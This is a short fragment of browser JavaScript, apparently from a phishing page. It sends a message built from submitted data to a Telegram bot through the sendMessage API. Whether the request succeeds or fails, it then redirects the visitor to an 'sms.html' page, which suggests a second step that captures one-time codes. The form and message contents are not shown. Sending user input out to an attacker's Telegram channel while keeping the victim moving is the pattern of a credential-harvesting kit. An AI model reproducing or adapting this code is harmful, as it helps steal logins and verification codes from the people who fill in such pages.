      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      fetch(url, {
          method: 'POST',
          headers: {
              'Content-Type': 'application/json'
          },
          body: JSON.stringify({
              chat_id: chatId,
              text: message
          })
      })
      .then(response => response.json())
      .then(data => {
          if (data.ok) {
              window.location.href = 'sms.html?id='+uid;
          }
      })
      .catch(error => {
        window.location.href = 'sms.html?id='+uid;
      });
  });
